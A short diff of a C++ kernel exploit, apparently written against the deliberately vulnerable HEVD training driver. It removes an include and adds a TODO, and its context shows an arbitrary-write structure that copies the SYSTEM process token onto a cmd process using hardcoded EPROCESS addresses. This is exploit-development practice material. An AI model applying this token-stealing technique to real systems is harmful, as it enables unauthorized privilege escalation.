@@ -2,8 +2,6 @@
 #include "PostExploitation.hpp"
 #include "HEVDCommunication.hpp"
 
-#include <iostream>
-
 namespace ArbitraryWrite
 {
 
@@ -16,6 +14,7 @@ void exploit()
 	std::memset(in_buffer.data(), 0, sizeof(in_buffer));
 	// ffffbe8c004b1080 cmd eprocess (+0x248 for token)
 	// ffffbe8bf96ac040 system eprocess (+0x248 for token)
+	// TODO: use PreExploitation to resolve these pointers via WWW (triggering the opposite way and using for RWW)
 	WriteWhatWhere www = { .What = 0xffffbe8bf96ac040 + 0x248, .Where = 0xffffbe8c004b1080 + 0x248 }; // Change token of owning cmd to system
 	std::memcpy(in_buffer.data(), &www, sizeof(WriteWhatWhere));
 
